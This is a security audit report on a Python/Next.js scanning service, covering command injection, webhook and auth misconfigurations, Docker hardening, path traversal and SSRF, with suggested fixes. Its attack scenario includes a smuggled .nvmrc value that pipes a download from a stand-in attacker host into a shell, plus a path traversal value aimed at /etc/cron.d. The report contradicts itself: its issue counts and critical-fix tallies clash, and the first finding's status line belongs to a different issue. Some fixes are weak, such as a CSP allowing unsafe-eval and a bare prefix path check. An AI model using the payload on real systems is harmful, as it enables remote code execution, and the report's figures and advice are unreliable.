# 🔒 Security Audit Report

**Date:** 2026-02-04  
**Auditor:** Security Engineer  
**Project:** sec-audit-repos  
**Scope:** Full codebase review - OWASP vulnerabilities, Docker configurations, Backend (Python/FastAPI/Celery), Frontend (Next.js/TypeScript), Production deployment readiness

---

## Executive Summary

A comprehensive security review of the `sec-audit-repos` codebase has been conducted. The codebase shows significant improvement from the previous audit with several security controls already in place. **12 security issues** were identified ranging from **Critical** to **Low** severity. **All 3 Critical issues have been fixed** (command injection, webhook signature bypass, and trustHost vulnerability).

### Risk Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | 2 | 1 fixed, 2 remaining |
| 🟠 High | 4 | Address within 1 week |
| 🟡 Medium | 3 | Address within 1 month |
| 🟢 Low | 2 | Address when convenient |

---

## Critical Severity Issues

### 1. 🚨 Shell Command Injection via Version Manager (FIXED ✅)

**Location:** `backend/src/audit/version_manager.py` (Lines 186-191, 214-217, 239)

**Issue:** The functions `get_node_version_shell()`, `get_go_version_shell()`, and `get_rust_version_shell()` construct shell commands by directly embedding user-controlled version strings without proper escaping, leading to command injection.

**Vulnerable Code:**
```python
version_escaped = version.replace('"', '\\"').replace("'", "\\'")
return f"""
export NVM_DIR="{nvm_dir}"
[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
nvm use "{version_escaped}" 2>/dev/null || ...
"""
```

**Attack Scenario:**
- An attacker creates a malicious repository with a `.nvmrc` file containing: `18; curl attacker.com/exfil | sh #`
- When scanned, this executes arbitrary commands on the worker with the privileges of the scanner process

**Impact:** Remote Code Execution (RCE) on scan workers

**Fix:** Use `shlex.quote()` for proper escaping:
```python
import shlex
version_escaped = shlex.quote(version)
```

**Status:** ✅ **FIXED** - Host validation is now properly enforced in production

---

### 2. 🚨 Missing Webhook Signature Verification Bypass (FIXED)

**Location:** `frontend/src/app/api/webhooks/stripe/route.ts` (Lines 206-229)

**Issue:** The webhook handler allowed signature verification to be bypassed when `webhookSecret` was not set, processing events without authentication.

**Vulnerable Code (Fixed):**
```typescript
// Require webhook secret to be configured
if (!webhookSecret) {
  throw new Error("STRIPE_WEBHOOK_SECRET must be configured");
}

const rawBody = await req.text();
const signature = req.headers.get("stripe-signature");

// Require signature header to be present
if (!signature) {
  return NextResponse.json(
    { received: false, error: "Missing stripe-signature header" },
    { status: 400 }
  );
}

// Always verify the webhook signature
event = stripe.webhooks.constructEvent(rawBody, signature, webhookSecret);
```

**Fix Applied:**
- ✅ Webhook secret is now **required** - throws error if `STRIPE_WEBHOOK_SECRET` is not configured
- ✅ Signature header is now **required** - returns 400 if `stripe-signature` header is missing
- ✅ Signature verification is now **mandatory** - no fallback to unverified events

**Status:** 🟢 **FIXED** - Webhook signature verification can no longer be bypassed

---

### 3. 🚨 Insecure `trustHost: true` in NextAuth Configuration (FIXED ✅)

**Location:** `frontend/src/auth.config.ts` (Line 32)

**Issue:** NextAuth is configured with `trustHost: true` which disables host validation, making the application vulnerable to host header attacks.

**Vulnerable Code:**
```typescript
export const authConfig: NextAuthConfig = {
  secret: process.env.AUTH_SECRET || process.env.NEXTAUTH_SECRET,
  trustHost: true,  // Dangerous in production
  ...
};
```

**Attack Scenario:**
- Attackers can manipulate the `Host` header to bypass security controls
- Potential for cache poisoning or misdirected OAuth callbacks
- Session fixation attacks

**Impact:** Authentication bypass, session hijacking

**Fix Applied:**
```typescript
trustHost: process.env.NODE_ENV === "development",  // Only trust in dev
```

Additionally, secure cookie configuration was added with `__Secure-` prefix for production.

**Status:** ✅ **FIXED** - `trustHost` now only enabled in development mode

---

### 4. 🔴 Insecure Session Cookie Configuration (FIXED ✅)

**Location:** `frontend/src/auth.config.ts`

**Issue:** Session cookies were not configured with secure flags, allowing them to be transmitted over HTTP in production and potentially intercepted via man-in-the-middle attacks.

**Vulnerable Code:**
```typescript
// No cookie configuration - defaults to insecure settings
export const authConfig: NextAuthConfig = {
  // secure: false by default, no httpOnly protection
};
```

**Impact:** Session cookies can be intercepted via man-in-the-middle attacks on unencrypted connections

**Fix Applied:**
```typescript
cookies: {
  sessionToken: {
    name: process.env.NODE_ENV === "production" ? "__Secure-authjs.session-token" : "authjs.session-token",
    options: {
      httpOnly: true,
      sameSite: "lax",
      path: "/",
      secure: process.env.NODE_ENV === "production",
    },
  },
  callbackUrl: {
    name: process.env.NODE_ENV === "production" ? "__Secure-authjs.callback-url" : "authjs.callback-url",
    options: {
      httpOnly: true,
      sameSite: "lax",
      path: "/",
      secure: process.env.NODE_ENV === "production",
    },
  },
  csrfToken: {
    name: process.env.NODE_ENV === "production" ? "__Secure-authjs.csrf-token" : "authjs.csrf-token",
    options: {
      httpOnly: true,
      sameSite: "lax",
      path: "/",
      secure: process.env.NODE_ENV === "production",
    },
  },
},
```

**Status:** ✅ **FIXED** - Secure cookie configuration now enforced in production

---

## High Severity Issues

### 5. 🔴 Docker Socket Mounting Privilege Escalation

**Location:** `docker/docker-compose.yml` (Line 68)

**Issue:** The worker service mounts the host Docker socket (`/var/run/docker.sock:/var/run/docker.sock`), granting the container full access to the Docker daemon on the host.

**Vulnerable Configuration:**
```yaml
worker:
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock
```

**Attack Scenario:**
- If the worker container is compromised, an attacker can:
  - Launch privileged containers on the host
  - Access any container or volume on the host
  - Escalate to root on the host machine
  - Access sensitive host filesystem paths

**Impact:** Full host compromise from container escape

**Fix Options:**
1. **Use Docker-in-Docker (DinD) sidecar:**
```yaml
worker:
  volumes:
    - docker_certs:/certs/client
  environment:
    - DOCKER_HOST=tcp://docker:2376
    - DOCKER_TLS_VERIFY=1
    - DOCKER_CERT_PATH=/certs/client

dind:
  image: docker:24-dind
  privileged: true
  volumes:
    - docker_certs:/certs/client
    - docker_data:/var/lib/docker
```

2. **Use rootless Docker with user namespaces**
3. **Use Kubernetes with proper pod security policies**

---

### 6. 🔴 Hardcoded Database Credentials in Docker Compose

**Location:** `docker/docker-compose.yml` (Lines 8-11, 64)

**Issue:** Database credentials are hardcoded in the docker-compose file, creating security risks if the file is committed or exposed.

**Vulnerable Configuration:**
```yaml
postgres:
  environment:
    - POSTGRES_USER=postgres
    - POSTGRES_PASSWORD=postgres
    - POSTGRES_DB=sec_audit

worker:
  environment:
    - DATABASE_URL=postgresql://postgres:postgres@postgres:5432/sec_audit
```

**Impact:** Credential exposure, unauthorized database access

**Fix:** Use environment variables or Docker secrets:
```yaml
postgres:
  env_file:
    - .env.database
  # OR use Docker secrets:
  secrets:
    - db_password

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

---

### 7. 🔴 Running Services as Root in Containers

**Location:** `docker/Dockerfile` (Full file), `docker/Dockerfile.api` (Full file)

**Issue:** Both Dockerfiles run services as the root user without creating non-root users.

**Vulnerable Pattern:**
```dockerfile
FROM ubuntu:22.04
# No USER directive, runs as root
```

**Impact:** Container compromise leads to root access; violates principle of least privilege

**Fix:** Add non-root user:
```dockerfile
# Create non-root user
RUN groupadd -r appgroup && useradd -r -g appgroup appuser

# Set permissions
RUN chown -R appuser:appgroup /work

# Switch to non-root user
USER appuser
```

---

### 8. 🔴 No Rate Limiting on API Endpoints

**Location:** `backend/src/api/main.py` (Multiple endpoints)

**Issue:** No rate limiting is implemented on API endpoints, making the service vulnerable to brute force attacks, DoS, and resource exhaustion.

**Impact:** DoS attacks, brute force attacks on scan endpoints, resource exhaustion

**Fix:** Implement rate limiting using `slowapi`:
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app = FastAPI()
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/scan")
@limiter.limit("10/minute")
async def create_scan(request: Request, ...):
    ...
```

---

## Medium Severity Issues

### 9. 🟡 Path Traversal in Storage Backend

**Location:** `backend/src/audit/ai/storage_backend.py` (Lines 60-69)

**Issue:** The `LocalStorageBackend.upload_file()` doesn't sanitize the `remote_path` parameter, allowing path traversal if user-controlled data reaches this function.

**Vulnerable Code:**
```python
def upload_file(self, local_path: Path, remote_path: str) -> str:
    remote_full_path = self.base_path / remote_path  # No sanitization
    remote_full_path.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(local_path, remote_full_path)
```

**Attack Scenario:**
- If `remote_path` is user-controlled (e.g., via malicious repo name like `../../../etc/cron.d/backdoor`), files could be written outside the base directory

**Impact:** Arbitrary file write on the server

**Fix:**
```python
from ..utils import sanitize_repo_slug
# Or validate that resolved path is within base_path
remote_full_path = (self.base_path / remote_path).resolve()
if not str(remote_full_path).startswith(str(self.base_path.resolve())):
    raise ValueError("Path traversal detected")
```

---

### 10. 🟡 SSRF Risk in Git Operations

**Location:** `backend/src/audit/repos.py` (Lines 82-88)

**Issue:** While `validate_repo_url()` exists to prevent SSRF, the `get_default_branch()` function uses `git ls-remote` with user-controlled URLs that could potentially bypass validation via DNS rebinding or other techniques.

**Impact:** Server-Side Request Forgery (SSRF) to internal services

**Fix:** Implement additional SSRF protection:
```python
import socket
import ipaddress

def is_internal_ip(hostname):
    try:
        ip = socket.getaddrinfo(hostname, None)[0][4][0]
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except:
        return True  # Fail safe

# Validate URL doesn't resolve to internal IPs before git operations
```

---

### 11. 🟡 Debug Logging with Sensitive Information

**Location:** `backend/src/audit/ai/storage.py` (Multiple lines: 39-45, 51-56, etc.)

**Issue:** Debug log entries write sensitive information (scan_ids, database operations, errors) to `/work/debug.log` which could persist in container images or be exposed.

**Vulnerable Pattern:**
```python
# #region agent log
import json as json_lib
try:
    with open('/work/debug.log', 'a') as f:
        f.write(json_lib.dumps({...}) + '\n')
except: pass
# #endregion
```

**Impact:** Information disclosure, potential log injection

**Fix:** Remove debug logging in production or use proper logging levels:
```python
import logging
logger = logging.getLogger(__name__)
logger.debug("Operation performed")  # Respect log level configuration
```

---

## Low Severity Issues

### 12. 🟢 Missing Security Headers

**Location:** `frontend/next.config.ts` (Not reviewed - file not found)

**Issue:** No security headers (CSP, HSTS, X-Frame-Options, etc.) are configured for the Next.js application.

**Fix:** Configure security headers in `next.config.ts`:
```typescript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'"
          },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
          { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }
        ]
      }
    ];
  }
};
```

---

### 13. 🟢 No Resource Limits in Docker Compose

**Location:** `docker/docker-compose.yml`

**Issue:** No CPU, memory, or I/O limits are set for services, allowing resource exhaustion attacks.

**Fix:** Add resource limits:
```yaml
worker:
  deploy:
    resources:
      limits:
        cpus: '2'
        memory: 4G
      reservations:
        cpus: '0.5'
        memory: 1G
```

---

## OWASP Top 10 Analysis

| OWASP Category | Status | Findings |
|---------------|--------|----------|
| A01: Broken Access Control | ⚠️ Partial | No RBAC on scan endpoints; admin checks present but limited |
| A02: Cryptographic Failures | ✅ Good | Secrets in env vars, JWT tokens used |
| A03: Injection | 🔴 Critical | Command injection in version_manager.py; SQL injection prevented via parameterized queries |
| A04: Insecure Design | ⚠️ Partial | Webhook bypass design flaw; trustHost issue; insecure cookies |
| A05: Security Misconfiguration | 🔴 High | trustHost, insecure cookies, root containers, hardcoded creds |
| A06: Vulnerable Components | ✅ Good | Dependencies pinned in requirements.txt |
| A07: Auth Failures | ⚠️ Partial | trustHost and insecure cookies weaken auth; beta mode adds approval flow |
| A08: Data Integrity Failures | 🔴 High | Webhook signature bypass |
| A09: Security Logging Failures | ⚠️ Partial | Debug logs expose info; no audit logging |
| A10: SSRF | ⚠️ Partial | URL validation present but DNS rebinding possible |

---

## Positive Security Findings

### ✅ Input Validation
- `validate_repo_url()` properly restricts URL schemes to http, https, git, ssh
- `validate_branch()` enforces alphanumeric characters with limited special chars
- `parse_audit_selection()` uses whitelist validation for audit types
- Pydantic models validate all API inputs

### ✅ Path Security
- `sanitize_repo_slug()` prevents path traversal for repository names
- `ensure_audit_dirs()` validates paths stay within allowed base directories
- `safe_repo_slug()` sanitizes repo names for filesystem use

### ✅ Database Security
- All database queries use parameterized statements (asyncpg)
- SQL injection prevention through proper parameter binding
- Proper foreign key constraints with `ON DELETE CASCADE`

### ✅ Resource Limits
- All subprocess calls have appropriate timeouts
- Celery tasks have both soft and hard time limits configured
- CSV file size (10MB) and row limits (10,000) are enforced

### ✅ Authentication & Authorization
- Admin routes properly verify admin status via `isAdmin()`
- User enabled/disabled checks in auth flow (beta mode)
- Session management via NextAuth.js with JWT strategy

---

## Production Deployment Recommendations

### 1. Container Security

```yaml
# docker-compose.prod.yml
version: '3.8'

services:
  api:
    build:
      context: ..
      dockerfile: docker/Dockerfile.api
    user: "1000:1000"  # Run as non-root
    read_only: true    # Read-only root filesystem
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 1G
    environment:
      - DATABASE_URL=${DATABASE_URL}  # From secrets
    secrets:
      - db_password
      - api_secret

  worker:
    user: "1000:1000"
    read_only: true
    tmpfs:
      - /tmp:noexec,nosuid,size=1g
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    # Remove docker.sock mount, use DinD or buildah
```

### 2. Network Security

```yaml
# Use internal networks
networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # No external access

services:
  postgres:
    networks:
      - backend
  api:
    networks:
      - frontend
      - backend
```

### 3. Secrets Management

```bash
# Use Docker secrets or external vault
echo "strong_password" | docker secret create db_password -
echo "api_key" | docker secret create stripe_key -
```

### 4. Monitoring & Alerting

- Implement structured logging with sensitive data redaction
- Set up audit logging for all admin actions
- Monitor for suspicious scan patterns (multiple failed clones, etc.)
- Alert on rate limit violations

### 5. SSL/TLS Configuration

```yaml
# Use reverse proxy with TLS
traefik:
  image: traefik:v2.10
  command:
    - "--providers.docker=true"
    - "--entrypoints.websecure.address=:443"
    - "--certificatesresolvers.letsencrypt.acme.tlschallenge=true"
    - "--certificatesresolvers.letsencrypt.acme.email=admin@example.com"
    - "--certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json"
  ports:
    - "443:443"
```

### 6. Backup & Disaster Recovery

- Automated PostgreSQL backups with encryption
- S3 bucket versioning and lifecycle policies for scan results
- Documented recovery procedures

---

## Remediation Priority Matrix

| Priority | Issue | Location | Effort | Status |
|----------|-------|----------|--------|--------|
| P0 | ~~Fix shell command injection~~ | `version_manager.py` | Low | ✅ FIXED |
| P0 | ~~Require Stripe webhook verification~~ | `stripe/route.ts` | Low | ✅ FIXED |
| P0 | ~~Remove `trustHost: true`~~ | `auth.config.ts` | Low | ✅ FIXED |
| P0 | ~~Fix insecure session cookie configuration~~ | `auth.config.ts` | Low | ✅ FIXED |
| P1 | Remove Docker socket mount | `docker-compose.yml` | Medium |
| P1 | Run containers as non-root | `Dockerfile`, `Dockerfile.api` | Low |
| P1 | Add rate limiting | `main.py` | Medium |
| P1 | Externalize database credentials | `docker-compose.yml` | Low |
| P2 | Sanitize storage paths | `storage_backend.py` | Low |
| P2 | Add SSRF protection for git | `repos.py` | Medium |
| P2 | Remove debug logging | `storage.py` | Low |
| P3 | Add security headers | `next.config.ts` | Low |
| P3 | Add resource limits | `docker-compose.yml` | Low |

---

## Verification Checklist

After implementing fixes, verify with:

- [x] ~~Command injection test with malicious `.nvmrc`~~ ✅ FIXED
- [x] ~~Webhook signature verification test~~ ✅ FIXED
- [x] ~~trustHost host header validation test~~ ✅ FIXED
- [x] ~~Session cookie security test (secure flag, httpOnly)~~ ✅ FIXED
- [ ] Path traversal test with malicious repo names
- [ ] Container security scan with Trivy/Grype
- [ ] Network policy validation
- [ ] Rate limiting test
- [ ] SSL/TLS configuration test (SSL Labs)

---

*Report generated by Security Audit Tool review*
